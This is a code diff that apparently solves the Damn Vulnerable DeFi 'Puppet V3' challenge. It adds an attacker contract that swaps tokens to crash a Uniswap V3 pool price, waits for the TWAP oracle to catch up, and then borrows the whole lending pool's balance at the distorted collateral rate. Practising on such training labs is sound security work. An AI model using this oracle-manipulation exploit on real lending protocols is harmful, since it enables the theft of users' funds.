@@ -10,6 +10,76 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
+import {TransferHelper} from "@uniswap/v3-core/contracts/libraries/TransferHelper.sol";
+    
+contract PuppetV3Attacker {
+    WETH immutable weth;
+    DamnValuableToken immutable token;
+    IUniswapV3Pool immutable uniswapV3Pool;
+    PuppetV3Pool immutable lendingPool;
+
+    constructor(
+        WETH _weth,
+        DamnValuableToken _token,
+        IUniswapV3Pool _uniswapV3Pool,
+        PuppetV3Pool _lendingPool
+    ) {
+        weth = _weth;
+        token = _token;
+        uniswapV3Pool = _uniswapV3Pool;
+        lendingPool = _lendingPool;
+    }
+
+    function manipulatePrice() external {
+        bool zeroForOne = address(token) == uniswapV3Pool.token0();
+
+        uniswapV3Pool.swap(
+            address(this),
+            zeroForOne,
+            int256(token.balanceOf(address(this))),
+            zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1,
+            ""
+        );
+    }
+
+    function borrowAll(uint256 amount, address recovery) external payable {
+        weth.deposit{value: msg.value}();
+
+        uint256 required = lendingPool.calculateDepositOfWETHRequired(amount);
+
+        weth.approve(address(lendingPool), required);
+        lendingPool.borrow(amount);
+
+        token.transfer(recovery, amount);
+    }
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata
+    ) external {
+        require(msg.sender == address(uniswapV3Pool), "not pool");
+
+        if (amount0Delta > 0) {
+            TransferHelper.safeTransfer(
+                uniswapV3Pool.token0(),
+                msg.sender,
+                uint256(amount0Delta)
+            );
+        }
+
+        if (amount1Delta > 0) {
+            TransferHelper.safeTransfer(
+                uniswapV3Pool.token1(),
+                msg.sender,
+                uint256(amount1Delta)
+            );
+        }
+    }
+
+    receive() external payable {}
+}
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,7 +189,23 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        PuppetV3Attacker attacker = new PuppetV3Attacker(
+            weth,
+            token,
+            lendingPool.uniswapV3Pool(),
+            lendingPool
+        );
+
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        attacker.manipulatePrice();
+
+        skip(114);
+
+        attacker.borrowAll{value: PLAYER_INITIAL_ETH_BALANCE}(
+            LENDING_POOL_INITIAL_TOKEN_BALANCE,
+            recovery
+        );
     }
 
     /**
